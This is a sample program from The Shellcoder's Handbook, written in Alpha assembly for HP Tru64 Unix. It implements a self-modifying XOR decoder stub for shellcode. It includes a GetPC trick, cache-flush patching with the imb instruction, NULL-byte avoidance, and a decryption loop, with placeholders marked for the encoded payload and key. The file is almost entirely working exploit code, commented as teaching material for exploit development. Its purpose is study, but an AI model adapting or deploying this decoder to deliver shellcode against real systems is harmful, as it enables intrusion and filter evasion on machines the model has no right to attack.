/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 13: HP Tru64 Unix Exploitation
Sample Program #3

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/


#include <alpha/regdef.h>
#include <alpha/pal.h>
        .text
        .arch   generic
        .align 4
        .globl  main
        .ent    main
main:
        .frame  $sp, 0, $26

        lda  a0, -1000(sp)     #GetPC code we have just covered.
back:
        bis  zero, 0x86, a1      #a1 equals to 0x00000086 which is the imb instructio
               #imb instruction syncs the instruction cache thus make it
                                  #coherent with main memory.

               #1st run: store imb instruction in sp - 1000 stack.
        stl  a1, -4(a0)           #2nd run: overwrite the following bsr instruction with imb.
        addq a0, 48, a2
        stl  a1, -4(a2)           #also overwrite the 0x41414141 with the imb instruction
                                  #thus avoiding i-cache incoherency af-ter the decode process
                                  #since imb instruction also have NULL bytes this is the only                                            #way to avoid NULL bytes in decoder loop.

        bsr  a0, back             #branch the label back saving pc in a0 register.
                                  #on the second run bsr will be over-written with nop.
                                  #execution will continue with the next instruction.
        addq a0, 52, a4     #offset to xored data plus four.
        addq zero, 212, a3     #size of xored data in bytes. !!CHANGE HERE!!
        addq a0, 264, a5          #offset to xor key; equals to xordata size plus 52. !CHANGE!
        addq a0, 48, a0           #a0 should point to the first instruc-tion of the xored data
                                  #real shellcode should be expecting it this way.

        ldl  a1, -4(a5)           #load the xor key.
xorloop:
        ldl  a2, -4(a4)           #load a single long from the xored data.
        xor  a2, a1, a2           #xor/decrypt the long.
        stl  a2, -4(a4)           #store the long back into its loca-tion.
        subq a3, 4, a3            #decrement counter.
        addq a4, 4, a4            #increment xored data pointer, move to next long.
        bne  a3, xorloop          #branch back to xorloop till counter is zero.
.long   0x41414141                #this long will be overwriten with the imb instruction. 
               #flush I-cache.

               #xored data starts here. Place the real shellcode encoded with 
               #the following XOR key. !!CHANGE HERE!!

.long   0x88888888                #XOR key. !!CHANGE HERE if necessary!!
        .end    main
